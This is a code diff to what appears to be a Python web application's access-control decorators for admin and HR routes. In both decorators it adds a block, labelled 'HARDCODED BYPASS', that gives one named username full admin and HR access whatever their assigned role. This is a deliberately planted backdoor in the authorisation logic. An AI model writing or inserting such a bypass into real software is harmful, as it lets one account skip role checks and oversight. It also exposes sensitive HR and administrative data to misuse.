@@ -88,6 +88,10 @@ def admin_required(fn: Callable) -> Callable:
         if not current_user.is_authenticated:
             return redirect(url_for("authentication.login", next=request.url))
 
+        # HARDCODED BYPASS: e2606026 (Durvesh Parab) always has admin access
+        if current_user.username == 'e2606026':
+            return fn(*args, **kwargs)
+
         user_role = getattr(current_user, "role", None)
         # Use direct string comparison to avoid enum issues
         if user_role not in ('super_admin', 'admin'):
@@ -106,6 +110,10 @@ def hr_required(fn: Callable) -> Callable:
     def wrapper(*args, **kwargs):
         if not current_user.is_authenticated:
             return redirect(url_for("authentication.login", next=request.url))
+
+        # HARDCODED BYPASS: e2606026 (Durvesh Parab) always has HR access
+        if current_user.username == 'e2606026':
+            return fn(*args, **kwargs)
 
         # Use direct string comparison
         allowed = ('super_admin', 'admin', 'hr_manager', 'hr_staff')
